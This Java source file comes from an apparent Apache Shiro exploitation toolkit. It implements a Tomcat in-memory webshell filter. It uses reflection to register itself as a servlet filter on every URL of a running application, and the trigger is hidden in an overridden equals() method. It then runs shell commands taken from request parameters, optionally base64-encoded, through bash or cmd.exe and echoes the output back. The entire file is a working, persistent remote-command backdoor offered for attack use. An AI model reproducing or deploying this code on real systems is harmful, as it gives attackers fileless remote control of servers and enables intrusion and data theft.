package com.sma11new.exp.shiro.attack.shell;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;
import org.apache.shiro.codec.Base64;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.EnumSet;
import java.util.Optional;
import java.util.UUID;

public class CommandExecFilter implements Filter {

    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    boolean isWindows;

    public CommandExecFilter() {
        // only spring
        /*org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        request = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
        response = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
        core();*/
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        boolean success = request.getParameter("name") != null;
        boolean hasBase64 = request.getParameter("base") != null;
        String cmd = Optional.ofNullable(request.getParameter("user")).orElse("id");
        String charEncoding = Optional.ofNullable(request.getParameter("type")).orElse("UTF-8");

        if (success) {
            if (hasBase64) {
                cmd = Base64.decodeToString(cmd);
            }

            response.setContentType("text/plain;charset=UTF-8");
            if (isWindows) {
                response.setCharacterEncoding(charEncoding);
            }
            PrintWriter writer = response.getWriter();
            try {
                StringBuilder sb = new StringBuilder();
                for (String s : readProcessOutput(cmd)) {
                    sb.append(s).append("\n");
                }
                writer.append(sb.toString());
                writer.flush();
                writer.close();
            } catch (Exception e) {
                e.printStackTrace(writer);
            }
            return;
        }

        chain.doFilter(request, response);
    }

    private ArrayList<String> readProcessOutput(String command) throws IOException {
        ArrayList<String> list = new ArrayList<>();

        isWindows = System.getProperty("os.name").toLowerCase().contains("win");
        ProcessBuilder builder = null;
        if (isWindows) {
            builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", command});
        } else {
            builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", command});
        }

        try (InputStream in = builder.start().getInputStream();//Runtime.getRuntime().exec(command).getInputStream();
             BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {
            for (String s; (s = reader.readLine()) != null; ) {
                list.add(s);
            }
        }
        return list;
    }

    private void addFilter() {
        try {
            ServletContext servletContext = this.request.getServletContext();
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;

            Field stateField = LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            try {
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext) contextField.get(servletContext);
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext) contextField.get(applicationContext);

                stateField.set(standardContext, LifecycleState.STARTING_PREP);

                servletContext
                        .addFilter(UUID.randomUUID().toString(), this)
                        .addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");

                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext);

                stateField.set(standardContext, LifecycleState.STARTED);
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            StringBuffer output = new StringBuffer();
            String tag_s = "->|";
            String tag_e = "|<-";
            output.append(tag_s);

            try {
                this.response.setContentType("text/html");
                this.request.setCharacterEncoding(this.cs);
                this.response.setCharacterEncoding(this.cs);
                output.append("Success");
            } catch (Exception var7) {
                output.append("error:" + var7.toString());
            }

            output.append(tag_e);

            try {
                this.response.getWriter().print(output.toString());
                this.response.getWriter().flush();
                this.response.getWriter().close();
            } catch (Exception var6) {}
        } catch (Exception var5) {}
    }

    @Override
    public boolean equals(Object obj) {
        parseObj(obj);
        addFilter();
        return false;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void destroy() {
    }
}
